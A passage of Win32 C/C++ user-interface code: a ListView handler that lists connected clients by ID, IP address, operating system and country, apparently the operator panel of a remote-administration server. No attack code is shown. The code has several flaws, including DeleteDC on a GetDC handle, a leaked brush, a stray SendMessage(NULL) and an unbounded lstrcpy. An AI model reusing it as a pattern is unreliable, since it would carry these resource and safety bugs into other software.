			int item = ListView_SubItemHitTest(_Handle->hWndList, &lVht);
			NMLVDISPINFO lvdi = { 0 };
			LV_DISPINFO FAR* tlvdi = (LV_DISPINFO FAR*)lParam;
			//NMHDR hdr = { 0 };
			//hdr.hwndFrom = ;
			//hdr.
		///	lvdi.hdr.hwndFrom = _Handle->hWndList;
			lvdi.hdr = tlvdi->hdr;
			lvdi.hdr.code = LVN_BEGINLABELEDIT;
			lvdi.item.iItem = item;
			lvdi.item.iSubItem = NMItem->iSubItem;
			
			//HWND lvEc = (HWND)SendMessage(_Handle->hWndList, LVM_GETEDITCONTROL, NULL, NULL);
			SendMessage(_Handle->hWndList, LVN_BEGINLABELEDIT, NULL, (LPARAM)&lvdi);
			SendMessage(NULL,NULL, NULL, NULL);
			break;
		}


	break;
	}
	
	switch (pLvdi->hdr.code)
	{
	
	case LVN_GETDISPINFO:

		switch (pLvdi->item.iSubItem)
		{
		case 1:     // ID
			pLvdi->item.pszText = _Handle->si.Connections[pLvdi->item.iItem].Clients->_ClientID;

			break;

		case 2:     // IP
			pLvdi->item.pszText = _Handle->si.Connections[pLvdi->item.iItem].Clients->_IPAdress;

			break;

		case 3:     // OS
			pLvdi->item.pszText = _Handle->si.Connections[pLvdi->item.iItem].Clients->_OperatingSystem;
			break;
		case 4:
			pLvdi->item.pszText = _Handle->si.Connections[pLvdi->item.iItem].Clients->_Country;
			break;
			/*
					case 3:     // INT Conversion
						wsprintf(szText, L"%u", );
						pLvdi->item.pszText = szText;
						break;

						*/
		default:
			break;
		}
		break;
		
	case LVN_BEGINLABELEDIT:
	{
		HWND hWndEdit;

		// Get the handle to the edit box.
		hWndEdit = (HWND)SendMessage(hWnd, LVM_GETEDITCONTROL,
			0, 0);
		// Limit the amount of text that can be entered.
		SendMessage(hWndEdit, EM_SETLIMITTEXT, (WPARAM)20, 0);
	}
	break;

	case LVN_ENDLABELEDIT:
	{
		int i = pLvdi->item.iItem;
		// Save the new label information
		if ((pLvdi->item.iItem != -1 && pLvdi->item.pszText != NULL))
			lstrcpy(_Handle->si.Connections[i].Clients->_ClientID, pLvdi->item.pszText);
		//MessageBox(NULL, NULL, NULL, NULL);
	}
	break;
	case NM_CUSTOMDRAW:
	{


		LPNMLVCUSTOMDRAW lplvcd = (LPNMLVCUSTOMDRAW)lParam;
		switch (lplvcd->nmcd.dwDrawStage)
		{
		case CDDS_PREPAINT:

				RECT rect;
				rect.left = 0;
				rect.right = 645;
				rect.top = (93 + (_Handle->si.ConnectionCounter * 16));
				rect.bottom = 335;
				//	0, 93,
				//	645, 243,
			
				if (rect.top > 0)
				{
					HDC hdc;
					hdc = GetDC(_Handle->mhWnd);
					FillRect(hdc, &rect, CreateSolidBrush(RGB(0x2C, 0x2C, 0x2C)));
					DeleteDC(hdc);
				}
			return CDRF_NOTIFYITEMDRAW;
		case CDDS_ITEMPREPAINT:
			
			int row;
			row = lplvcd->nmcd.dwItemSpec;

			
				lplvcd->clrText = RGB(255, 255,255); // change the  text color
				lplvcd->clrTextBk = RGB(44, 44, 44);// ...

			return CDRF_NEWFONT;

		}
	}
	

	default:
		break;
		


	
		
	}


	return 0L;
}


void DrawItemStatic(HWND Hwnd,LPDRAWITEMSTRUCT pDIS,  COLORREF Color, HANDLE font)
{

	WCHAR staticText[99];
	int len = SendMessage(Hwnd, WM_GETTEXT,
		ARRAYSIZE(staticText), (LPARAM)staticText);
	SetTextColor(pDIS->hDC, Color);
	SelectObject(pDIS->hDC, font );
	TextOut(pDIS->hDC, pDIS->rcItem.left, pDIS->rcItem.top, staticText, len);

}

void DrawItemListView()
{

}